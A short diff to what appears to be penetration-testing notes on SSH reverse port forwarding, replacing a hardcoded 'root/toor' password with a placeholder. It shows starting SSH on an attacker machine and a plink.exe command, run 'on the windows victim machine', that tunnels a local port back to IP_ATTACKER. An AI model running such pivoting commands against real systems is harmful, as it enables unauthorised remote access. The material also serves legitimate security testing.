@@ -7,7 +7,7 @@
 * ssh service restart
 * ssh service start
 [+] On the windows victim machine
-* plink.exe -l root -pw toor -R PORT:127.0.0.1:PORT IP_ATTACKER
+* plink.exe -l root -pw YOUR_SSH_PASSWORD -R PORT:127.0.0.1:PORT IP_ATTACKER
 * y
 
 [!] TRY TO USE THE ENTER KEY A COUPLE OF TIMES IN CASE YOU DON'T SEE NOTHING
